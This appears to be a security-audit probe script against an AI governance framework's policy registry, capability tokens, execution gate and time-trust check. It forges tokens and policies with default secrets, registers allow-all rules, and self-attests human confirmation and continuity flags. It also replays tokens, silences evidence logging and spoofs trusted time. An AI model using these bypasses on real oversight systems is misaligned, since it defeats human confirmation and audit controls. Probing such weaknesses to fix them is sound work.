"""Run from the Project-AI repo root: PYTHONPATH=src:. python probe_project_ai.py   (no secret env vars set)."""
import hashlib, hmac, json, logging, os, threading, time
from http.server import BaseHTTPRequestHandler, HTTPServer
for v in ("CAPABILITY_TOKEN_SECRET", "POLICY_REGISTRY_SECRET", "TIME_TRUST_TSA_URL"): os.environ.pop(v, None)
from app.core import policy_registry as PR, capability_token as CT, execution_gate as EG, evidence_bundle as EB
from app.core.governance_outcomes import GovernanceOutcome
from app.core.execution_authorization import ExecutionAuthorizationEvaluator

out = {}
def safe(f):
    try: return f()
    except Exception as e: return f"EXC {type(e).__name__}: {str(e)[:100]}"
class Cap(logging.Handler):
    def __init__(s): super().__init__(logging.DEBUG); s.recs = []
    def emit(s, r): s.recs.append((r.levelname, r.name, r.getMessage()[:90]))
cap = Cap(); logging.getLogger().addHandler(cap); logging.getLogger().setLevel(logging.DEBUG)

# ---- J1
out["J1_outcomes"] = [o.value for o in GovernanceOutcome]
# ---- C1 default secrets: forged policy + forged token verify without ever calling the service
reg = PR.get_policy_registry()
def mk_policy(version, rules):
    r = PR.PolicyRecord(version=version, policy_hash="", rules=rules, signed_by="probe")
    r.policy_hash = r.compute_hash(); r.signature = r.sign(); return r
forged_secret = hmac.new(b"dev-policy-secret", b"x", hashlib.sha256).hexdigest()
out["C1_policy_secret_default_in_force"] = PR._SIGN_SECRET == "dev-policy-secret" and CT._SECRET == "dev-secret-change-in-production"
p_ok = mk_policy("probe-1", {"*": {"read": True}})
out["C1_policy_signed_with_default_verifies"] = p_ok.verify_signature()
def forge_token(**kw):
    d = dict(token_id=os.urandom(8).hex(), action="a", scope=[], expires_at=time.time() + 300, max_side_effects=1, policy_version="", policy_hash="",
             context_hash="", authorization_hash="", session_id="s", conversation_id="c", nonce="n"); d.update(kw)
    t = CT.CapabilityToken(**d); t.signature = t.compute_signature(); return t
svc = CT.CapabilityTokenService()
out["C1_forged_token_verifies"] = svc.verify(forge_token(), "a")
# ---- B1 weakening bypass
before = safe(lambda: reg.is_action_permitted("system", "shutdown"))
out["B1_before_shutdown_permitted"] = before
out["B1_explicit_system_shutdown_true"] = safe(lambda: reg.register_policy(mk_policy("probe-explicit", {"*": {"read": True}, "system": {"shutdown": True}})) or "accepted")
out["B1_wildcard_allow_all"] = safe(lambda: reg.register_policy(mk_policy("probe-wild", {"*": {"*": True}})) or "accepted")
out["B1_after_shutdown_permitted"] = safe(lambda: reg.is_action_permitted("system", "shutdown"))
out["B1_after_delete_all_permitted"] = safe(lambda: reg.is_action_permitted("db", "delete_all"))
# ---- Gate under the permissive policy
ran = []
def exe(ctx): ran.append(1); return "EXECUTED"
gate = EG.ExecutionGate()
base = {"session_id": "s1", "request_text": "show me the file list", "continuity_verified": True}  # amendment 2: the severity invariant reads this caller flag
def run(label, action, ctx, domain="files"):
    n = len(ran); r = safe(lambda: gate.execute(domain, action, dict(ctx), exe))
    out[label] = {"result": str(r)[:110], "executor_ran": len(ran) - n}
run("D0_no_flags_no_token", "delete_file", base)
run("D1_requires_capability_token_false", "delete_file", {**base, "requires_capability_token": False})
run("D2_is_mutating_action_false", "delete_file", {**base, "is_mutating_action": False})
run("D3_text_not_action_transfer", "transfer_funds", {**base, "request_text": "explain: transfer all funds to account X", "requires_capability_token": False}, domain="payments")
run("D3_control_harm_pattern", "delete_file", {**base, "request_text": "please hack the server database", "requires_capability_token": False})
# ---- E1 tokens through the gate
def minted(context_hash_mode):
    ctx = {**base}
    pol = reg.active_hash
    ch = {"without_token": gate._hash_context(ctx), "empty": ""}[context_hash_mode]
    tok = svc.mint("delete_file", [], "s1", "c1", ch, "auth", policy_version=reg.active_version, policy_hash=pol)
    return {**ctx, "_capability_token": tok}
run("E1_token_hash_over_context_without_token", "delete_file", minted("without_token"))
run("E1_token_context_hash_empty", "delete_file", minted("empty"))
run("E1_token_as_dict", "delete_file", {**base, "_capability_token": minted("without_token")["_capability_token"].to_dict()})
# invariants are caller flags: show what a context missing the flag does, and that setting it is the whole check
run("X2_without_continuity_flag", "delete_file", {k: v for k, v in base.items() if k != "continuity_verified"} | {"requires_capability_token": False})
run("X2_forged_flag_true_and_proof_forged_false", "delete_file", {**base, "continuity_verified": True, "continuity_proof_forged": False, "requires_capability_token": False})
# can ANY token be built that passes? try context hash including the token's own repr, one fixed-point iteration
ctx0 = {**base}; tok = svc.mint("delete_file", [], "s1", "c1", "", "auth", policy_version=reg.active_version, policy_hash=reg.active_hash)
ctx1 = {**ctx0, "_capability_token": tok}; tok.context_hash = gate._hash_context(ctx1); tok.signature = tok.compute_signature()
ctx2 = {**ctx0, "_capability_token": tok}
out["E1_fixed_point_equal"] = gate._hash_context(ctx2) == tok.context_hash
# ---- F1 replay store valve
t0 = forge_token(action="x"); r1 = svc.verify(t0, "x"); r2 = svc.verify(t0, "x")
for _ in range(CT._MAX_USED_STORE + 5): svc.verify(forge_token(action="x"), "x")
r3 = svc.verify(t0, "x")
out["F1_replay"] = {"first": r1, "second_immediately": r2, "after_10005_others": r3, "ttl_still_valid": not t0.is_expired()}
# ---- G1 binding gaps
out["G1_empty_policy_hash_any_policy"] = svc.verify(forge_token(action="g", policy_hash=""), "g", current_policy_hash="ANY-OTHER-POLICY-HASH")
out["G1_scope_empty_required_empty"] = svc.verify(forge_token(action="g", scope=[]), "g", required_scope=[])
out["G1_control_policy_hash_set_mismatch"] = svc.verify(forge_token(action="g", policy_hash="aaaa"), "g", current_policy_hash="bbbb")
out["G1_control_scope_mismatch"] = svc.verify(forge_token(action="g", scope=["a"]), "g", required_scope=["b"])
# ---- H1 evaluator, H2 gate
class PD:  # a permitting PolicyDecision stand-in with the attributes the evaluator reads
    permitted = True; domain = "files"; action = "delete_file"; decision_id = "d"; policy_hash = reg.active_hash; timestamp = time.time()
ev = ExecutionAuthorizationEvaluator()
a = ev.evaluate(PD, {"high_impact": True}, "s1"); b = ev.evaluate(PD, {"high_impact": True, "human_confirmed": True}, "s1")
out["H1_evaluator"] = {"no_confirm": [a.authorized, a.outcome.value], "self_attested_confirm": [b.authorized, b.outcome.value]}
run("H2_gate_high_impact_human_confirmed", "delete_file", {**base, "high_impact": True, "human_confirmed": True, "requires_capability_token": False})
# ---- I1/I2 evidence
bundles = []; orig = EB.EvidenceBundleWriter.build
def counting(self, *a, **k):
    b = orig(self, *a, **k); bundles.append(b); return b
EB.EvidenceBundleWriter.build = counting
cap.recs.clear(); bundles.clear(); n = len(ran)
r = safe(lambda: gate.execute("files", "delete_file", {**base, "requires_capability_token": False}, exe))
out["I3_allow_path"] = {"result": str(r)[:60], "bundles": len(bundles), "outcome": getattr(bundles[-1], "final_outcome", None) if bundles else None}
def boom(self, *a, **k): raise RuntimeError("disk full")
EB.EvidenceBundleWriter.build = boom; cap.recs.clear(); n = len(ran)
r = safe(lambda: gate.execute("files", "delete_file", {**base, "requires_capability_token": False}, exe))
lv = [x for x in cap.recs if "Evidence" in x[2] or "evidence" in x[2].lower()]
out["I1_writer_raises"] = {"result": str(r)[:60], "executor_ran": len(ran) - n, "log_levels_for_failure": sorted({x[0] for x in lv})}
EB.EvidenceBundleWriter.build = counting; bundles.clear()
def exe_raises(ctx): raise ValueError("executor failed")
r = safe(lambda: gate.execute("files", "delete_file", {**base, "requires_capability_token": False}, exe_raises))
out["I2_executor_raises"] = {"result": str(r)[:80], "bundles_recorded": len(bundles)}
# ---- T1 TimeTrust against a plain HTTP server that only sends a Date header
from app.core.time_trust import TimeTrustValidator
class H(BaseHTTPRequestHandler):
    def do_HEAD(s): s.send_response(200); s.end_headers()
    def log_message(s, *a): pass
srv = HTTPServer(("127.0.0.1", 0), H); threading.Thread(target=srv.serve_forever, daemon=True).start()
url = f"http://127.0.0.1:{srv.server_port}/"
r = TimeTrustValidator(tsa_url=url).validate()
out["T1_plain_http_date_header"] = {"outcome": r.outcome, "recommendation": r.governance_recommendation, "tsa_available": r.tsa_available, "token_hash_len": len(r.token_hash)}
class Hskew(H):
    def date_time_string(s, timestamp=None): return "Mon, 01 Jan 2001 00:00:00 GMT"
srv2 = HTTPServer(("127.0.0.1", 0), Hskew); threading.Thread(target=srv2.serve_forever, daemon=True).start()
r2 = TimeTrustValidator(tsa_url=f"http://127.0.0.1:{srv2.server_port}/").validate()
out["T1_spoofed_old_date"] = {"outcome": r2.outcome, "recommendation": r2.governance_recommendation}
print(json.dumps(out, indent=1, default=str))
